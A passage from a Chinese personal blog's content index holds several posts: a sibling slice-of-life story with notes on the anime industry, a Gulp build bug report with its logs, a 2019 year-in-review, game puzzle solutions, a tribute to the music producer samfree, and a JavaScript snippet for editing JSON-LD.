更不用说，总之就是制作难度不高。说白了点，没那么烧钱。\n而一部动漫的制作，一般只有两种途径。一是动画公司自己投资创作，二是委员会委托创作。前者的制作大多来源情怀，而后者只是一个单纯拿工资的。一般动画的制作涉及很多方的利润问题，比如电视台、广告、周边，所以一般都是由投资方出资制作的。\n一部动漫的续作会因为作画风格等种种原因，一般是交给前作的负责公司，不过前提是要有钱、要能赚钱，钱的来源可以是自己出也可以是投资，后者居多也正是为什么有如此多的动漫都是人气轻小说漫画游戏改编。\n出于情怀创作自主投资的典型例子就是京都。\n投资制作一般会结合前作各种因素再决定如何制作续作。但也有先播吸引投资再播的例子。（比如国内的镇魂街2）\n假如把电视台比作你（委员会）家楼下的房东，那么动画公司就可以比作房东的儿子。\n现在房东想把房子租出去，需要进行“宣传”，宣传到位了，钱也就赚到了。\n房子卖的好了，了解的人多了，房东还可以通过各种途径赚钱，如“买房再出租”、“将房子空出来作为拍电影的场所”、“找人来翻修房子”。\n房东儿子在这里就没有任何作用了，房东儿子仅仅可以帮房东算账看房子。\n动画是赚钱的商业手段，会动的美少女背后并不仅仅是轻松的日常，有些动画的口碑再好，没有利润也是白谈续作。\n常说的 BD 销售在动画行业的利润占比其实并不是很高，稍微计算便可得知。一部 12 话每话 20 min 的标准动画成本大约在 1.5-3 亿日元，BD 若以单价 6000 日元计算，5000 销售额的利润便是三千万日元，这还只是毛利，不可控制成本肯定无法避免。一般来说深夜档动画会卖得多，但销量高也并不一定代表利润高，比如轻音 2。\n不过 BD 的销量一般可以衡量其他周边的销量，所以有些动画会以 BD 销售额作为第二季制作的基石。\n同为基石的当然还是原作量，原作量不够也是难产，甚至经常出现靠广播剧和 CD 来填剧情的现象。\n不过目前漫画更至 62 话且一直在以 ONC 形式更新，原作量上是没什么问题的。\n总而言之，这个奇怪的行业却能产出不奇怪的动画，也是件奇怪的事情了……\n不过这些知识都是从友章哥那里听来的，他好像说了一部叫什么白箱的动画哎管他呢肯定不是什么有意思的作品。\n「哦哦，这个叫 Lerche 的动画制作公司居然还制作过『机巧少女不会受伤』」\n我正在 Oricon 网站上找这部『Hakumei to mikochi』的 BD 销量，自然而然看到了同家公司的作品。\n「啊啊是『昂宿七星』、还有『游戏三人娘』和『彼方的阿拉斯加』，好厉害的公司，我以前都不知道」\n「哦哦！这是欠了一个诺贝尔和平奖的芳文社的『学园孤岛』」【NETA 因为芳文社作品以百合、萝莉为主体，常被视为世界和平的象征】\n静不下来静不下来……我开始在沙发上手舞足蹈。\n我在沙发上抬起头，正对上头发还有水滴残留的友章哥那看疯子般的眼神。\n「……你怎么了？」\n「没什么……做做运动做体操，瑜伽那些的」\n我敷衍了几句，翻了个身，继续埋头盯着平板。\n「这样吗，没想到你会的挺多的」\n「一般般吧」\n友章哥去厨房倒了杯水，然后走到沙发边朝我打了个手势示意我让开。\n「话说啊，友章哥」\n「嗯？」\n「为什么这些动漫的 BD 没什么销量啊」\n我把刚刚查到的 Lerche 公司信息通过平板递给友章哥。\n「『妖精森林的小不点』还说得过去，但是为什么『昂宿七星』只有 58 销售量啊」\n「这种事情不是个人喜好吗，就算你问我我也不知道怎么说啊」\n「是没有人喜欢吗？明明是那么好的作品？轻小说也是令人非常感动的说？这不是很异常吗？友章哥？」\n我一步步逼问着友章哥。\n「那个……」\n一回头正好和我对上目光的友章哥表情突然慌张了起来。\n好近，太近了……\n察觉到这一点的我，因为觉得害臊也把脸扭开了。\n我和友章哥分别占据沙发的两端。我偷看了他一眼，他扭头背对着我。\n像是在缓解紧张的情绪，我用手指一圈圈地卷着头发。\n……我们是兄妹啊，所以这种事情我向来没有在意过。\n不过一旦开始在意了，就会变得非常难为情，这让我不由得移开了视线……奇怪，明明天气不热，为什么感觉脸颊有点发烫。\n……\n本篇 真是令人羡慕的兄妹！为了说出这句话，花了将近五千字。\n我也好想要个能陪在我身边开玩笑说着啊看哥哥又在傻笑了的可爱妹妹啊！\n现在正处于春夏的换季，天气一会儿冷，一会儿热的，让人静不下心去学习。时间也是不知不觉就来到了高考 90 天，就算是以前怎样都无所谓的我也感到了压迫感，看着这对自己亲笔写出来的兄妹的日常故事，要加油不输给他们的想法也在我脑中回响着。\n这次写的是福原友章和福原里香兄妹的日常，大家还喜欢吗？这个原本没多少计划的短篇，不知不觉间写了一天的时间，也写到了接近五千的字数。原本只是想写最近的一些事情，干脆就用轻小说的形式写了。这篇短文由一丝丝灵感和一丝丝冲动、还有人生几千亿分之一的时间构成，要素包含了福原兄妹日常和动画科普。实在想不出怎么写却又不想借用以前的原创时，就从家里的几本轻小说借用了一些描写，痕迹可能也比较明显，大家看得开心就好了。动画科普中的知识大多来自「SHIROBAKO」（白箱）这部动画还有来自知乎的补充科普，真心感觉每个奋力的创作者都是非常可爱的呢！写的时候还想到了很多梗，因为记不太清了和剧情限制就没写上去。\n说到白箱，最近出了其剧场版的主视觉图，真是非常令人期待她们之间后续的故事。\n这次为了更好地衬托写作主题——日常，将短篇的背景设在了日本 2017 年的冬季，正好是『妖精森林的小不点』这部动漫的播出季。最近正好也二追了这部温馨日常童话剧 poi 的小故事，不得不让人感叹到，真是令人向往的生活啊。\n如果可以的话，我还是非常想继续写这对兄妹之间的故事，不过这也只是脑中的想法而已。人的脚步停下来的话，也就不知道前方的路长什么样。\n日常的价值是非凡，而我也要逐渐从一种日常状态转为另一种日常状态了。过多的无用信息在占用着我的时间，最近也在考虑着要不要换个圈子，不擅长交友连换个圈子都难，不过总有办法的吧！\n宅久了偶尔也会冒出“啊啊自己果然不行啊”的想法，不过一想到在我的周围还有很多支持着我期待着我的人，我也会觉得不能辜负他们，特别是我的三年级国文老师，你现在过得如何呢？\n家母也并没有因为我的游手好闲而督促我去上网课，偶尔有些真心话无法说出来的时候，就会觉得亲人也并不一定是最亲近的人，而可能是最亲近的陌生人。虽然非常的无情，但也是对我而言的事实。\n最近的 kano VR live 对我一介高中生来说预算成本太高了，所以并没有去现场的准备。\n最近弃了 Sublime 并将 Markdown 的编写工作全部转移到了 VScode MPE。\n说起来啊，昨天的我——不对，如果说 3 月 9 日 0 时前的我是『昨天的我』，那么过了 3 月 10 日的0 时，『昨天的我』又会变成『前天的我』，如果照此推下去，『昨天的我』这种说法并非一个可靠的印象。可如果把『昨天的我』解释成过去的我那就说得通了，而过去的我又是每个时间段的我的结合体，也就是现在的我，所以，昨天的我=过去的我=现在的我。\n总之，3 月 8 日的晚上几乎从来没看过 B 站动态、B 站一天点击数不超过 3 次的我在偶然的搜索中进入了 B 站的动态页然后开始闲逛起了 vtb 们的动态。\n如果仅是这样还没什么好说的，我竟然翻出了西电在 4 小时前的招生宣传片投稿。\n这肯定是一种象征，hahaha，kadana！【NETA 少女编号，一句津津乐道的台词，意思是“赢了”】\n这次是用写轻小说的形式来写的博文，所以很多平时不常说的话或是不好表达的话都可以较无忌惮地写出来。同时我也十分担心自己是否有将轻小说的魅力展现出来，科普是不是有做的不到位的地方。另外我在关于我的介绍和 2019 年度总结中提及的轻小说是与上面这篇故事无关的。\n如果我的板绘达到了拿得出来见人的水平，我也会非常乐意画出可爱的福原兄妹。\n下次再见吧！\n","date":"2020-03-09T19:22:29+08:00","permalink":"https://blog.tinyume.com/2020/how-to-walk-tiny-little-life/","title":"How to walk tiny little life"},{"content":"大概在年初 1 月多时被友人提醒了我的博客访问可能出了问题，后半信半疑地在隐私模式打开博客确实发现了一些问题，再拿去 Google insight 也出现了一样的问题，这才开始了 Bug 的分析。\n异常如下：\ncheck console，没有重大警告或者错误。\ncheck network，无异常。\nCloudflare proxy 已关闭\n当时近期的改动便是 Gulp。将 node_modules 重装一遍异常页面依旧。\n刚开始使用 Gulp 时，build 网页是可以正常访问的，故之后的每次 build 便懒得去检查页面的是否正常显示。\n从 gulpfile.js 中逐一分析排查出了 Bug 的位置，是在 compressJs。\n再将有执行 compressJs 的和没有执行的分别保存为 html 并 diff\n神奇之处出现了————\n这两个文件除了端口号不同，其他都一致。\n端口号的不同是由于使用 Brackets 在 Chrome 动态调试的结果。\n懵了一圈后去命令行找了找 gulp build 的输出 log\n如下————\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 INFO 178 files generated in 1.9 s [18:46:46] Finished \u0026#39;generate\u0026#39; after 3.56 s [18:46:46] Starting \u0026#39;compressHtml\u0026#39;... [18:46:46] Compress HTML: public/404.html [18:46:46] Compress HTML: public/index.html [18:46:46] Compress HTML: public/laycomment.html [18:46:47] Compress HTML: public/about/index.html [18:46:47] Compress HTML: public/archives/2019-nian-du-zong-jie.html [18:46:47] Compress HTML: public/archives/bu-shu-gitalk-chu-xian-de-keng.html [18:46:47] Compress HTML: public/archives/gulp-de-shen-qi-bug.html [18:46:47] Compress HTML: public/archives/how-to-walk-tiny-little-life.html [18:46:47] Compress HTML: public/archives/index.html [18:46:47] Compress HTML: public/archives/lu-nai-samfree.html [18:46:48] Compress HTML: public/archives/material-geng-duo-xin-xi.html [18:46:48] Compress HTML: public/archives/our-end-of-the-world.html [18:46:48] Compress HTML: public/archives/tzmcm-bi-sai-guo-cheng-jie-guo.html [18:46:48] Compress HTML: public/archives/xian-chong-du-bao-zha-ba.html [18:46:48] Compress HTML: public/archives/yin-se-feng-jing.html [18:46:48] Compress HTML: public/archives/zai-html-zhong-yong-js-cao-zuo-json.html [18:46:48] Compress HTML: public/categories/index.html [18:46:48] Compress HTML: public/links/index.html [18:46:49] Compress HTML: public/kami/index.html [18:46:49] Compress HTML: public/timeline/index.html [18:46:49] Compress HTML: public/archives/2020/index.html [18:46:49] Compress HTML: public/archives/2019/index.html [18:46:49] Compress HTML: public/categories/日常/index.html [18:46:49] Compress HTML: public/categories/代码/index.html [18:46:49] Compress HTML: public/categories/知识/index.html [18:46:49] Compress HTML: public/categories/随想/index.html [18:46:49] Compress HTML: public/page/3/index.html [18:46:50] Compress HTML: public/page/2/index.html [18:46:50] Compress HTML: public/archives/2020/01/index.html [18:46:50] Compress HTML: public/archives/2020/02/index.html [18:46:50] Compress HTML: public/archives/2020/03/index.html [18:46:50] Compress HTML: public/archives/2019/09/index.html [18:46:50] Compress HTML: public/archives/2019/07/index.html [18:46:50] Compress HTML: public/archives/2019/10/index.html [18:46:50] Compress HTML: public/archives/2019/11/index.html [18:46:50] Compress HTML: public/archives/page/3/index.html [18:46:50] Compress HTML: public/archives/page/2/index.html [18:46:50] Compress HTML: public/archives/2019/page/2/index.html [18:46:51] Compress HTML: 38 items [18:46:51] Finished \u0026#39;compressHtml\u0026#39; after 4.69 s [18:46:51] Starting \u0026#39;compressCss\u0026#39;... [18:46:51] Compress CSS: public/css/disqus-proxy.css [18:46:51] Compress CSS: public/css/duoshuo.css [18:46:51] Compress CSS: public/css/gitalk.css [18:46:51] Compress CSS: public/css/ie-blocker.css [18:46:51] Compress CSS: public/css/material-icons.css [18:46:51] Compress CSS: public/css/material.css [18:46:51] Compress CSS: public/css/prettify.css [18:46:51] Compress CSS: public/css/style.css [18:46:51] Compress CSS: public/css/uc.css [18:46:51] Compress CSS: 9 items [18:46:51] Finished \u0026#39;compressCss\u0026#39; after 948 ms [18:46:51] Starting \u0026#39;compressJs\u0026#39;... [18:46:52] Compress JS: public/js/MathJax.js [18:46:53] Compress JS: public/js/Valine.min.js [18:46:54] Compress JS: public/js/clicklove.js [18:46:54] Compress JS: public/js/funnytitle.js [18:46:54] Compress JS: public/js/gitalk.min.js [18:46:56] Compress JS: public/js/hanabi-browser-bundle.js [18:46:57] Compress JS: public/js/ie-blocker.en.js [18:46:57] Compress JS: public/js/ie-blocker.zhCN.js [18:46:57] Compress JS: public/js/jquery.min.js [18:46:58] Compress JS: public/js/js.js [18:46:59] Compress JS: public/js/js.min.js [18:46:59] Compress JS: public/js/lazyload.min.js [18:47:00] Compress JS: public/js/lsloader.js [18:47:00] Compress JS: public/js/lsloader.min.js [18:47:00] Compress JS: public/js/md5.min.js [18:47:00] Compress JS: public/js/nprogress.js [18:47:00] Compress JS: public/js/prettify.min.js [18:47:00] Compress JS: public/js/queue.js [18:47:00] Compress JS: public/js/queue.min.js [18:47:00] Compress JS: public/js/smoothscroll.js [18:47:00] Compress JS: public/js/gallery/gallery.js [18:47:00] Compress JS: 21 items [18:47:01] Finished \u0026#39;compressJs\u0026#39; after 9.22 s [18:47:01] Starting \u0026#39;deploy\u0026#39;... INFO Deploying: git INFO Setting up Git deployment... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 INFO 178 files generated in 2.71 s [19:17:09] Finished \u0026#39;generate\u0026#39; after 5.07 s [19:17:09] Starting \u0026#39;compressHtml\u0026#39;... [19:17:09] Compress HTML: public/404.html [19:17:09] Compress HTML: public/index.html [19:17:09] Compress HTML: public/laycomment.html [19:17:09] Compress HTML: public/about/index.html [19:17:10] Compress HTML: public/categories/index.html [19:17:10] Compress HTML: public/archives/2019-nian-du-zong-jie.html [19:17:10] Compress HTML: public/archives/bu-shu-gitalk-chu-xian-de-keng.html [19:17:10] Compress HTML: public/archives/gulp-de-shen-qi-bug.html [19:17:10] Compress HTML: public/archives/how-to-walk-tiny-little-life.html [19:17:11] Compress HTML: public/archives/index.html [19:17:11] Compress HTML: public/archives/lu-nai-samfree.html [19:17:11] Compress HTML: public/archives/material-geng-duo-xin-xi.html [19:17:11] Compress HTML: public/archives/our-end-of-the-world.html [19:17:11] Compress HTML: public/archives/tzmcm-bi-sai-guo-cheng-jie-guo.html [19:17:11] Compress HTML: public/archives/xian-chong-du-bao-zha-ba.html [19:17:12] Compress HTML: public/archives/yin-se-feng-jing.html [19:17:12] Compress HTML: public/archives/zai-html-zhong-yong-js-cao-zuo-json.html [19:17:12] Compress HTML: public/kami/index.html [19:17:12] Compress HTML: public/links/index.html [19:17:12] Compress HTML: public/timeline/index.html [19:17:13] Compress HTML: public/categories/日常/index.html [19:17:13] Compress HTML: public/categories/代码/index.html [19:17:13] Compress HTML: public/categories/随想/index.html [19:17:13] Compress HTML: public/categories/知识/index.html [19:17:13] Compress HTML: public/archives/2019/index.html [19:17:13] Compress HTML: public/archives/2020/index.html [19:17:13] Compress HTML: public/page/2/index.html [19:17:13] Compress HTML: public/page/3/index.html [19:17:14] Compress HTML: public/archives/2019/07/index.html [19:17:14] Compress HTML: public/archives/page/3/index.html [19:17:14] Compress HTML: public/archives/2019/09/index.html [19:17:14] Compress HTML: public/archives/2019/10/index.html [19:17:14] Compress HTML: public/archives/page/2/index.html [19:17:14] Compress HTML: public/archives/2020/01/index.html [19:17:14] Compress HTML: public/archives/2019/11/index.html [19:17:14] Compress HTML: public/archives/2020/02/index.html [19:17:15] Compress HTML: public/archives/2020/03/index.html [19:17:15] Compress HTML: public/archives/2019/page/2/index.html [19:17:15] Compress HTML: 38 items [19:17:15] Finished \u0026#39;compressHtml\u0026#39; after 6.32 s [19:17:15] Starting \u0026#39;compressCss\u0026#39;... [19:17:15] Compress CSS: public/css/disqus-proxy.css [19:17:15] Compress CSS: public/css/duoshuo.css [19:17:15] Compress CSS: public/css/gitalk.css [19:17:15] Compress CSS: public/css/ie-blocker.css [19:17:15] Compress CSS: public/css/material-icons.css [19:17:15] Compress CSS: public/css/material.css [19:17:16] Compress CSS: public/css/prettify.css [19:17:16] Compress CSS: public/css/style.css [19:17:16] Compress CSS: public/css/uc.css [19:17:16] Compress CSS: 9 items [19:17:16] Finished \u0026#39;compressCss\u0026#39; after 1.08 s [19:17:16] Starting \u0026#39;deploy\u0026#39;... INFO Deploying: git INFO Clearing .deploy_git folder... 两次的 build 是不一样的，但是生成的文件却相同。\n相同的文件也由于不同的 build 产生了不同的结果。\n问题尚未解决。因为没时间就先把记录留在这里。\n若在别处得到了答案，我会在第一时间补充博客。\nAfter Day 这篇文章原计划是 2 月初便要写的，咕了一段时间后连着 3 月那篇闲聊发了出来。\n日期就随便糊了个单身狗的日子（简称狗日的）\n顺便封面也是可爱的狗狗（是幼犬酱啦~）\n疾病盛行，小心出行。\n","date":"2020-02-14T20:02:14+08:00","permalink":"https://blog.tinyume.com/2020/hexo-gulp-bug-report/","title":"Gulp 的神奇 BUG"},{"content":"「记忆与情感，正因为短暂而显珍贵」\nPreface 之前没写过年度总结，但去年稍显特别。在寒假期间安静下来后，便也想写点东西来纪念纪念（趁我还没忘干净）\nGoogle Analytics 月访问量稳定在 30-40（实际未知，cloudflare 给出数据是 1000），和隔壁大佬比起来简直相形见绌，并感谢所有访问者。\n去年依旧没项目，一直鸽着（\n博客依旧用的全白嫖服务，在去年底是打算用赞助的 J1900 做个 Server，搬了家后，新地方只能嫖楼下 WiFi。\n博客的 UX 即使改过很多次也不是很满意。高考完有空会重写一次博客 UX。\nPast Tense 书 这一部分很多废话，如果你不想浪费宝贵时间，请直接点开目录并选择性浏览。\neBook \u0026amp; Lightnovel 春物、友少、有妹、三坪、神的记事本、慌坏、望月、夏娜以及一堆科幻等等，其余想不起的 eBook 都在 Kindle 中，但我的 Kindle 在高三初，也就是去年 9 月被学校收了。台购和港购的轻小说有「三个我与四个她的双人游戏」、「世界什么的怎样都好」1-2、以及不想说的很多\u0026hellip;\u0026hellip;买纪念的有「友少港版」12、「刀剑神域 uw」19、「春物港版」13。还有三秋搥的六本轻小说（目前没看「君の话」）、少女编号全、「星之声」「云之彼端」新海诚这系列的好几本。也有「麦田的守望者」「人间失格」「罗生门」，咸鱼 100 块捡的「讲道理，你没有我可爱」1-8（不好看很失望）\nADV（归为书这一类是因为我认为其文字表现是主体） 包括常说的 Galgame。拔作众多就不讲了。去年最喜欢的 NVL 是橘子班的「Tiny Snow」，巫贼大大的画真的是非常可爱（国内推），不乏对爱情的思考，里面涉及到的很多哲理，我在过去的读书中都有共感，个人甚至去找炒饭大大要了文本。个人而言是神作，一辈子难忘的作品。TAVG 中感触很深的有「Deliver me」，这也是我在 Steam 平台玩的较早的游戏。还有千恋、色鸟鸟、光鸟鸟、Sweet\u0026amp;Tea 的三部作品、纸魔人、温泉乡、Recette、沙耶之歌（没玩完丢了存档，现在不想玩了）、D 社、三色绘恋等等，不对着打了。妹系的还是小品居多，其中大多也只是卖肉，看好的也就有兽娘养成计划和 WABISHABI，不过也只是看好，剧情方面显然不足，角色塑造也不够就开始卖肉了。哲理性的 ADV 依旧不多，本人也逐渐对没完没了的拔作、废萌感到疲倦，有些甚至不如 steam 的免费 NVL。业界的堕落显而易见。这些失去创作灵魂的东西，也只配成为时代的产物。真正的辉煌，永远充满了人性的思考、闪烁着理性的光辉。\n实体书 算上 Kindle 和实体书（除去以上两类），图书馆借的自己买的，大概 40 多本（至少）。我也不想去翻了，能想到的就有人类简史、未来简史、社会心理学、岸本的几本书、几本诗歌集、局外人和鼠疫、便利店和山茶店、百年孤独、被埋葬的巨人、美妙的新世界、内向者优势、平凡的世界、超脱、几本悬疑推理、在路上、周国平的和柏拉图的、樊登的、罪与罚、麦田的守望者、知更鸟女孩 1-3、亲爱的安德烈、我们仨、萤火虫。好了，也有很多书评，不过没整理过，很多只是写在日记上。特别想提出来的是罪与罚，真是太 tm 有魅力了，很多场景的描写都富含诗意，比如饱受欺辱的女孩选择了跳江那部分，有青年选择给钱救女孩的那部分，艺术上特别是对环境简化的描写，是一大特色（反正我是写不出），咋看咋顺眼，看完还想看的那种感觉吧。\n此外还有一些漫画、绘本，以及一大堆咕咕咕的计算机书籍。\n番剧 「少女编号」。这是继美术社、new game 之后，第三部值得留在盘里反复品味的佳作。起因是轻小说前传吸引了我，然后这部番的剧情真的好到超出我的预料（还有老渡的疯狂自黑与业界黑）\n「比宇宙更远的地方」。其实是年前看的，不必多说，BD 预购了。\n计算机 Bootstrap 3 -\u0026gt; Bootstrap 4（目前咕到一半多） HTML -\u0026gt; Flask（喵喵喵？） Python 2 -\u0026gt; Python 3 + numpy + pandas + plt PHP -\u0026gt; Laravel 完善了前年写的两个静态页面，一个登陆页面（未开源） 一些 Python on Raspberrypi 的自做小程序 咕掉的 imgbot ci 咕掉的 Python 物理图像分析与函数求解 咕掉的单片机实验 咕掉的自制无人机 咕掉的音乐 MAD 制作 咕掉的一些 PR 生活中的变化-2019 卡布奇诺 -\u0026gt; 特浓咖啡（我是卡布奇诺党~~ 手绘 -\u0026gt; 板绘（只熟悉了笔触和线稿 开始吃褪黑素 轻小说构思进展（笔稿和电子稿接近 1 万字算进展吗 认识了两位国轻作家 7.31 开始写日记 10.31 了了个小心结 浏览器书签 +300~ Muse Dash 100+ 数学建模与数据分析 Kernel Panic Fatel exception: Dumping (relocation in 0x00509102) Fatel exception: Dumping (relocation in 0x02909102)\n1.1 Life is a bunch of shit\nLife is a bitch\nI thought we could be good people\nLoved by everyone\nBut God doesn\u0026rsquo;t want us to\nHe would rather we do the dishes\nFreedom looks like a bit of bullshit\nThat\u0026rsquo;s just how life owns you\nSo, fuck God.\nFuture Tense 无迹可寻，却早已注定。\n四下都没有人的气息。\n大街上到处都是漂亮的白色高楼，\n就如同绘画纸搭建的模型一样，仿若是\n虚假的光景。\n","date":"2020-01-21T12:37:56+08:00","permalink":"https://blog.tinyume.com/2020/2019-summary/","title":"六月与高挂夜空的半月"},{"content":"Steam 秋促喜加一，买了橘子班的两部游戏\n此游戏谜题众多，于是记录一下本人的一些谜解\n第三章 B 线 A 区【密码锁】 一个勉强能跑的 Python 算法:\n1 2 3 4 5 6 7 8 9 10 11 12 13 output = [] for a in range(1,10): for b in range(1,10): for c in range(1,10): for d in range(1,10): for e in range(1,10): for f in range(1,10): for g in range (1,10): for h in range(1,10): for i in range(1,10): if (a*100000000+b*10000000+c*1000000+d*100000+e*10000+f*1000+g*100+h*10+i)*i+a*10 == 1111111111*a: output.append([a, b, c, d, e, f, g, h, i]) print(output) 输出为 1-9 的顺序列表，以此对应密码锁的密码为【3】【9】【2】\nW 区【椅子摆动规律】 将上个房间得到的奇怪文字横着摆放，大概是下列形式（请以左为上竖置）\nP-R-N-D-2-L\nP→N→D→L→R→2\n按照指针顺序在列表做指向，向上即为前进，向下即为后退\n得出规律【后】【后】【后】【前】【后】\n0 总游戏时长 16 小时\n未完成【END 16】【Ture END】【Happy END】\n两个隐藏成就未解锁\n【END 16】是在 3A4B 时不选择探索并增加好感，难怪总找不出来（医生居然猜中了我是为全成就而来\n【Ture End】解释游戏的设计，表明了在世界末日中未能拯救女主的真男主为自己设计了这个虚拟游戏，去揭秘他想要的「真相」，大概是想明白自己的「选择」是否正确，真正的男主并不是现实中的那个，「美好的，幸福的，悲伤的，痛苦的」可以对应上 4 个 NE，最后暗示真男主死了。\n【Happy END】这个是跟着【True END】的，TE 竟然要在 Branch 停留 10s，还以为是【END 16】的充分条件未解锁然后刷关刷到心竭\u0026hellip;此 END 是现实男主的后来生活和某些连上【True End】剧情的解读，真男主死去后，复活作为「引路人」即引导游戏进入第三章的那个陌生人，其中存在伪命题悖论，如果是真正的影响了过去现实世界，按照游戏剧情女主应该进入避难所活了下来，这样就不会产生 HE 了，但实际上，后面所说的话又是在警告现实男主，然而这个游戏不就是你自己设计然后玩的吗？？？自己杀自己？hmm，「这副躯体不是我的，看来要回【避难所】了」，看到这里大概可以明白，这只是他个人的宣泄罢了，是对自己在虚拟游戏中愧对女主行为的忏悔。最后终于回到「现实？」讲述游戏的发展，玩到最后，也不太想去追究什么现实或是虚幻，什么是对什么是错，或许这才是游戏作者想传递的吧？\nTE 的目的并不都在于去解释这个游戏，而是说，要去把握重视的东西，即便一开始便知道自己最终无法得到，也要珍惜自己的情感，珍惜其对于人生的重要意义。\n游戏还有两篇番外小说「我和她和他的世界末日」「末日之后与秩序之前」\u0026hellip;三个人的相互依偎和 TE 的后续，值得期待。\n以下为本人的思维导图\nDownload: 末日.xmind\nWho can like shelter?\n","date":"2019-11-29T13:50:10+08:00","permalink":"https://blog.tinyume.com/2019/our-end-of-the-world/","title":"我和她的世界末日"},{"content":"\n说实话，信息量和情感有点大，都不知道从何谈起了，首先是一句「对不起」，然后还能想到的是「我来晚了」\n这一次的话题我想了想，自己也没法劝导别人看开，也没法说出「生老病死是常态」亦或是「逝者已去，重要的是活着」这些话，生活有诸多不顺，每个人的经历也不尽相同，但有一点可以确信，这只是无数个让你成长的经历中的一个\n背景故事：samfree 是 V 家和 U 家的著名 P 主，于 2015 年 9 月 24 日因疾病不幸去世，享年 31 岁，而此年正好是鹿乃的出道年，可以说，samfree 对鹿乃的支持不可或缺，两人也是很好的朋友\n2019-1-07 鹿乃 Radio スケジュール更新\nTeichiku Records\n2019-9-20 鹿乃专辑「いつかの約束を君に」（汉译「与你曾经的约定」）发行消息\nTwitter\n2019-9-24 Youtube 鹿乃 スペシャル配信ライブ\nOfficial\nTwitter\n2019-9-25 スペシャル配信ライブ 录音\nYoutube\n收录曲总共有 8 首（云村似乎超快上专辑的 都是 samfree 未完成的歌曲\n在 Youtube 的录音前段听到了鹿乃的抽泣声，可能 samfree 一直是鹿乃心中的一道伤吧\n鹿乃虽然主打萌系，但和大多数萌系唱见不一样，从鹿乃的歌声中我更能听出一种救赎的感觉，这也是我单推鹿乃的原因\n不管别人怎么看，我觉得，不仅仅因为这 8 首歌的词本身带悲伤色彩，更能听出鹿乃削减了以往可爱的风格，换上略带悲伤的嗓音，在努力地想要传达自己的声音给在天堂的 samfree\n文章这张缩略图是鹿乃带白菊的图片，同时手握吉他代表着对 samfree 从前的怀念，整幅图配上音乐让我鼻头有点发酸\n不管是失败、成功、放弃、妥协，肯定都只是人生的一部分，没有什么可以作为人生的评判标准，或悲伤、开心、苦闷、迷惑，我都会支持着鹿乃\n希望鹿乃可以尽快适应，拥有自己的强大力量，努力实现自己的理想！\n","date":"2019-10-31T09:28:51+08:00","permalink":"https://blog.tinyume.com/2019/kano-samfree/","title":"kano ~ samfree"},{"content":"起因 在修复结构化数据时，尝试使用原生 JS 去操作含在 html 标签内的 Json\n简易实现方法 Json Example 1 2 3 4 5 6 7 8 \u0026lt;script id=\u0026#34;myjsonid\u0026#34; type=\u0026#34;application/ld+json\u0026#34;\u0026gt; { \u0026#34;headline\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;datePublished\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;dateModified\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;\u0026#34; // 不能添逗号否则 parse 报错 } \u0026lt;/script\u0026gt; 第一种方法 1 2 const script = document.getElementById(\u0026#34;myjsonid\u0026#34;); script.firstChild.nodeValue = \u0026#39;{\u0026#34;headline\u0026#34;: \u0026#34;myheadline\u0026#34;, \u0026#34;datePublished\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;dateModified\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg\u0026#34;}\u0026#39;; // Completely replace it 第二种方法 1 2 const script = document.getElementById(\u0026#34;myjsonid\u0026#34;); script.textContent = \u0026#39;{\u0026#34;headline\u0026#34;: \u0026#34;myheadline\u0026#34;, \u0026#34;datePublished\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;dateModified\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg\u0026#34;}\u0026#39;; // Completely replace it Output 1 \u0026lt;script id=\u0026#34;myjsonid\u0026#34; type=\u0026#34;application/ld+json\u0026#34;\u0026gt;{\u0026#34;headline\u0026#34;: \u0026#34;myheadline\u0026#34;, \u0026#34;datePublished\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;dateModified\u0026#34;: \u0026#34;1024-1024-1024\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg\u0026#34;}\u0026lt;/script\u0026gt; 这样毫无疑问很麻烦，如果只想要改一对键值的话，全部替换岂不要命？\n上面方法只是操作了 Json 字符串，但是 JS 娘还有各种操作 Json 对象的方法，那么可以将其转化为对象然后再偷梁换柱一波\n最终实现 1 2 3 4 5 6 7 const script = document.getElementById(\u0026#34;myjsonid\u0026#34;); const obj = JSON.parse(script.firstChild.nodeValue); obj.headline = \u0026#34;myheadline\u0026#34;; obj.datePublished = \u0026#34;1024-1024-1024\u0026#34;; obj.dateModified = \u0026#34;1024-1024-1024\u0026#34;; obj.image = \u0026#34;https://i.loli.net/2019/10/31/9kjzeQfiy43HK2B.jpg\u0026#34;; script.firstChild.nodeValue = JSON.stringify(obj); // Also use script.textContent ","date":"2019-10-31T00:27:08+08:00","permalink":"https://blog.tinyume.com/2019/modify-json-dom-in-html/","title":"JS 操作 Json 